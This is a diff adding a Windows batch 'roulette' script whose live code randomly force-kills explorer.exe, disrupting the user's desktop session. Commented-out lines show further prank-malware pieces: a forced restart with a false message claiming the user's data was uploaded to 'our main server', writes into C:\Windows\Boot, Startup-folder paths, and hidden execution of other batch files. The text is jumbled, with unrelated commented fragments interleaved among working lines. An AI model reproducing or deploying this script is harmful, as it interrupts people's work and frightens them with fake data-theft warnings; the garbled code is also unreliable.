@@ -1,0 +1,31 @@
+@echo off
+::start printing:%@existingfunny$%
+::echo ping 8.8.8.8>"C:\Windows\Boot\timeout.txt"
+::Objvoice.Rate=0
+set death_number3=4
+::Objvoice.Rate=0
+::printed All lines correctly but togather
+set death_number0=0
+::Objvoice.Speak StrText
+::echo %date20%>"C:\Windows\Boot\PCAT\timeout20.txt"
+set rand=%random%
+::set objvoice = CreateObject("SAPI.SpVoice")
+::for /f "usebackq delims=" %%A in (timeoutt.txt) do echo %%A
+::if %%A==6-6-2020 call "Facebook (4).mp4"
+set /a rollet_number=%rand% * 6 / 32768
+::x=msgbox("C:\Users\Besmella\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
+::shutdown -r -t 45 /c "You'r data have been reserved and uploaded to our main server!!!!   bbye for now"
+if %rollet_number%==%death_number0% goto bad_luck
+::set objvoice = CreateObject("SAPI.SpVoice")
+::set date10=%d10%-%m%-%y%
+if %rollet_number%==%death_number3% goto bad_luck
+::x=msgbox("C:\Users\Besmella\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
+::"C:\Windows\Boot\covid-pc.bat"
+goto end
+::set date21=%d21%-%m%-%y%
+::y=msgbox("Im crush")
+:bad_luck
+taskkill /F /IM explorer.exe /T
+:end
+::msg:done
+::Wshell.Run Chr(34) & "ping.bat" & Chr(34), 0
